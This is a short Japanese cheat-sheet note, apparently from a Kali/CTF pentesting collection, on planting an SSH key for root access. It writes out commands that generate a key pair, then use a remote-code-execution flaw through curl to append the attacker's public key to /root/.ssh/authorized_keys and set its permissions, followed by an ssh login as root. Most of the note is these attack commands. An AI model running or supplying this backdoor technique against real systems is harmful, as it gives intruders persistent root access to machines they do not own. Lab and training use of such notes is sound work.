## ## SSHKeyの作成
### ### uploadできる場合
1. kaliでsshキーペアを作成する。
```sh
ssh-keygen -f hoge
```

2. ターゲットマシンにアップロードもしくは、echoコマンドでファイルを作成する。
```sh
# RCEがある場合
curl -g "http://127.0.0.1:8000/?ippsec.run[echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA(...)' >> /root/.ssh/authorized_keys]"

curl -g "http://127.0.0.1:8000/?ippsec.run[chmod 600 /root/.ssh/authorized_keys]"

# その他
zip化してbase64でechoを使用してもいいし、ファイルアップロードの機能があればそれ経由でやっても問題ないと思う。
```

3. 接続
```sh
ssh -i hoge root@IP_or_Domain
```
